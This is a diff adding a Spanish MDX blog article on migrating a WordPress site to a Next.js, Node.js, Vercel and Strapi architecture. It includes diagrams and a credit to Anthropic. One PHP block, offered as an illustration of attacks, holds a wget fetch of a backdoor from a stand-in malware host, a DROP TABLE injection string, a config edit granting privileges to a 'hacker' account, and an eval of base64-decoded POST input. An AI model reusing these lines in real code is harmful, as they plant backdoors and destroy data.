@@ -1,0 +1,299 @@
+import { ArticleLayout } from "@/components/ArticleLayout";
+import React from "react";
+import Image from "next/image";
+import wordpress from "./wordpress.webp";
+
+export function LogosAnthropic(props) {
+  return (
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      viewBox="0 0 100 100"
+      width="1em"
+      height="1em"
+      {...props}
+    >
+      {/* Fondo circular */}
+      <circle
+        cx="50"
+        cy="50"
+        r="48"
+        fill="none"
+        stroke="currentColor"
+        strokeWidth="2"
+      />
+
+      {/* Hexágono central */}
+      <path
+        d="M50 20
+           L75 35
+           L75 65
+           L50 80
+           L25 65
+           L25 35
+           Z"
+        fill="none"
+        stroke="currentColor"
+        strokeWidth="2"
+      />
+
+      {/* Líneas internas */}
+      <path
+        d="M50 20 L50 80
+           M25 35 L75 65
+           M75 35 L25 65"
+        stroke="currentColor"
+        strokeWidth="1.5"
+        opacity="0.7"
+      />
+
+      {/* Puntos de intersección */}
+      <g fill="currentColor">
+        <circle cx="50" cy="50" r="2" />
+        <circle cx="50" cy="20" r="2" />
+        <circle cx="50" cy="80" r="2" />
+        <circle cx="25" cy="35" r="2" />
+        <circle cx="75" cy="35" r="2" />
+        <circle cx="25" cy="65" r="2" />
+        <circle cx="75" cy="65" r="2" />
+      </g>
+
+      {/* Detalles decorativos */}
+      <path
+        d="M50 15 L50 5
+           M50 95 L50 85
+           M85 50 L95 50
+           M5 50 L15 50"
+        stroke="currentColor"
+        strokeWidth="1"
+        opacity="0.5"
+      />
+    </svg>
+
+)
+}
+
+export const article = {
+  author: "Diego Herrera Gré",
+  date: "2024-12-03",
+  title: "La migración de un sitio WordPress: arquitectura y tecnologías",
+  description:
+    "La migración de un sitio WordPress antiguo a una nueva arquitectura sin PHP, usando JavaScript en el Frontend, NodeJS en el backend, Next.js como el framework del frontend, Vercel como plataforma de despliegue, y Strapi como CMS si es que es necesario la gestión de contenido.",
+};
+
+export const metadata = {
+  title: article.title,
+  description: article.description,
+};
+
+export default (props) => <ArticleLayout article={article} {...props} />;
+
+<Image src={wordpress} alt="wordpress" quality={100} loading="lazy" />
+
+¿Qué podemos decir de WordPress? Es el CMS más popular del mundo, basado en PHP, que fue el primer lenguaje de programación que se usó para crear sitios web dinámicos con interactividad directa en el HTML. Con el tiempo, la funcionalidad inicial de WordPress, que fue la gestión de blogs, se ha ido extendiendo a la gestión de cualquier tipo de contenido, y se ha convertido en una herramienta esencial para la creación de sitios web de todo tipo.
+
+Todos los años, WordPress y PHP son sentenciados a muerte por influencers tecnológicos y expertos en seguridad informática, y cada año vuelven a la vida con nuevas versiones y correcciones de vulnerabilidades. Son herramientas bastante robustas, pero no son infalibles.
+
+```php
+
+<?php
+
+// Definición de una variable global
+$mensaje = '¡Hola, mundo desde WordPress!';
+
+// Función para saludar
+function saludar() {
+    global $mensaje; // Acceder a la variable global
+    echo $mensaje;
+}
+
+// Función para mostrar información sobre WordPress
+function infoWordPress() {
+    $version = '6.0';
+    $descripcion = 'WordPress es un sistema de gestión de contenido (CMS) que permite crear y gestionar sitios web de manera sencilla.';
+
+    echo "Versión de WordPress: $version\n";
+    echo "Descripción: $descripcion\n";
+}
+
+// Llamadas a las funciones
+saludar();
+echo "\n";
+infoWordPress();
+
+// Función para listar los plugins instalados
+function listarPlugins() {
+    $plugins = get_option('active_plugins'); // Obtener plugins activos
+    echo "Plugins activos:\n";
+    foreach ($plugins as $plugin) {
+        echo "- " . $plugin . "\n";
+    }
+}
+
+// Llamar a la función para listar plugins
+listarPlugins();
+```
+
+## ¿Por qué migrar?
+
+Aunque WordPress es la herramienta más usada del mundo para crear contenido y sitios webs, cada día tiene mayores desventajas que los programadores deben enfrentar a la hora de traducir los conflictos hacia el cliente, quien no necesariamente es un experto en tecnologías web.
+
+> **Nota**: Este artículo está enfocado en explicar las razones técnicas y de negocio para migrar un sitio WordPress a una arquitectura moderna. No es una crítica al CMS ni a PHP, sino una guía para entender cuándo es conveniente realizar esta migración y qué tecnologías utilizar.
+
+## El problema de la ciberseguridad con WordPress, una naturaleza inherentemente insegura
+
+Para poder expandir su rubro y sus capacidades, WordPress ha incorporado a lo largo de todos los años una serie de plugins de terceros que mejoraron mucho las funciones de la plataforma, pero también han introducido una serie de vulnerabilidades que han hecho que el CMS sea una naturaleza inherentemente insegura. Primero, los plugins de terceros no son desarrollados por el equipo de WordPress, sino por desarrolladores independientes que no necesariamente tienen las mismas prácticas de seguridad que el equipo de desarrollo de WordPress. Segundo, muchos de estos plugins no son mantenidos, lo que los hace ser susceptibles a ser hackeados y usados para llevar a cabo actividades malintencionadas. Un caso claro será Custom Fields Suite, el cual fue dejado sin mantenimiento este mismo año 2024, y no tardará mucho en que comiencen a aparecer vulnerabilidades que permitirán a los atacantes acceder a la información de los sitios web que usan este plugin.
+
+> ⚠️ **Advertencia**: Si estás usando WordPress en producción, es fundamental mantener todos los plugins y temas actualizados, así como realizar copias de seguridad regulares. La mayoría de los ataques exitosos a sitios WordPress se producen por plugins desactualizados o abandonados. Considera implementar medidas adicionales de seguridad como WAF (Web Application Firewall) y monitoreo constante de actividades sospechosas.
+
+## La arquitectura de WordPress
+
+Es una arquitectura de estilo vertical.
+
+1. PHP en el servidor, JavaScript en el cliente, WordPress en en el backend de cliente, base de datos MySQL o MariaDB, y el servidor web Nginx o Apache.
+2. Usualmente, todo puesto en una misma máquina.
+3. Los atacantes saben que si un sitio web está usando WordPress, podrían usar patrones típicos de WordPress para hackearlo. Por ejemplo, el típico exploit de WordPress es usar el archivo `wp-config.php` para obtener acceso al servidor, o el xmlrpc.php para obtener acceso a la API de WordPress o usar el archivo `wp-cron.php` para ejecutar comandos del sistema, etc. También buscarán el directorio `wp-content` para encontrar los archivos de los plugins y temas que están usando el sitio web, algo que no puede cambiarse fácilmente.
+
+```php
+$wp_config = file_get_contents('/var/www/html/wp-config.php');
+
+// Ejemplo de código malicioso que podría explotar vulnerabilidades
+$malicious_code = "<?php system('wget http://malware.com/backdoor.php'); ?>";
+$vulnerable_plugin = "/wp-content/plugins/custom-fields/upload.php";
+
+// Intento de inyección SQL
+$sql_injection = "'; DROP TABLE wp_users; --";
+
+// Intento de manipulación de archivos
+if(file_exists($wp_config)) {
+    $modified_config = str_replace(
+        'DB_PASSWORD',
+        "DB_PASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';",
+        $wp_config
+    );
+    file_put_contents('/tmp/wp-config.php', $modified_config);
+}
+
+// Intento de ejecución remota de código
+eval(base64_decode($_POST['exploit']));
+
+```
+
+## La arquitectura moderna
+
+### 🏗️ Estructura del Sistema
+
+```markdown
+📱 CLIENTE WEB
+│
+▼
+⚡ FRONTEND (Next.js)
+│ • Server-Side Rendering (SSR)
+│ • Static Site Generation (SSG)
+│ • React Components
+│ • TypeScript
+│
+▼
+🚀 VERCEL PLATFORM
+│ • Despliegue Automático
+│ • CDN Global
+│ • Serverless Functions
+│
+▼
+🔒 BACKEND (Node.js)
+│ • REST API
+│ • GraphQL Endpoints
+│ • Middleware & Auth
+│ • Business Logic
+│
+▼
+🌐 API GATEWAY
+│ • Rate Limiting
+│ • Caching
+│ • Load Balancing
+│
+▼
+💾 DATABASE 📝 CMS (Strapi)
+MongoDB • Gestión de Contenido
+• NoSQL • API Headless
+• Sharding • Multi-usuario
+• Escalable • Personalizable
+```
+
+### 🔄 Flujo de Datos
+
+```markdown
+1️⃣ Cliente solicita página
+⬇️
+2️⃣ Frontend procesa solicitud
+⬇️
+3️⃣ Backend valida y procesa
+⬇️
+4️⃣ Database almacena/recupera
+⬇️
+5️⃣ CMS gestiona contenido
+```
+
+### 🎯 Características Principales
+
+```markdown
+FRONTEND ⚡
+• Renderizado Híbrido (SSR/SSG)
+• Componentes React Optimizados
+• TypeScript para Type Safety
+• Rutas Dinámicas
+
+BACKEND 🔒
+• APIs RESTful
+• GraphQL Endpoints
+• Autenticación JWT
+• Middleware Seguro
+
+DATABASE 💾
+• Esquemas Flexibles
+• Índices Optimizados
+• Sharding Automático
+• Backups Automáticos
+
+CMS 📝
+• Interface Amigable
+• API-First Design
+• Multi-usuario
+• Workflows Personalizados
+```
+
+### 🔐 Seguridad
+
+```markdown
+CAPA 1: Frontend
+• HTTPS
+• CSP Headers
+• XSS Protection
+
+CAPA 2: Backend
+• JWT Authentication
+• Rate Limiting
+• Input Validation
+
+CAPA 3: Database
+• Encryption at Rest
+• Access Control
+• Audit Logging
+```
+
+La idea de esta arquitectura es que el frontend se encargue de la presentación del contenido, el backend se encargue de la lógica de negocio, la base de datos se encargue de almacenar y recuperar la información, y el CMS se encargue de la gestión de contenido. El Front-End suele ser siempre el que está más al alcance de ser vulnerado debido a que es básicamente una aplicación web que se ejecuta en el navegador del cliente, y no requiere de permisos especiales para ser accedido, sino que es abierta para su uso.
+
+### Conclusión
+
+La migración de un sitio WordPress antiguo a una nueva arquitectura sin PHP, usando JavaScript en el Frontend, NodeJS en el backend, Next.js como el framework del frontend, Vercel como plataforma de despliegue, y Strapi como CMS si es que es necesario la gestión de contenido, es una buena idea para poder tener un sitio web más seguro, escalable y fácil de mantener. Esto no significa que PHP se morirá, que WordPress es inseguro o que NextJS a la vez que JavaScript y NodeJS no tienen sus propias vulnerabilidades (como por ejemplo el Node Package Manager, que es el gestor de paquetes de NodeJS, y que ha tenido una serie de problemas de seguridad a lo largo de sus años de uso debido al uso de paquetes de terceros).
+
+<div className="flex items-center gap-2 rounded-lg bg-gray-100 px-6 py-4 dark:bg-gray-800">
+  <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
+    Ayudado con Anthropic
+  </span>
+  <LogosAnthropic
+    width="32"
+    height="32"
+    alt="logo anthropic"
+    className="color-inverse text-black dark:invert"
+  />
+</div>
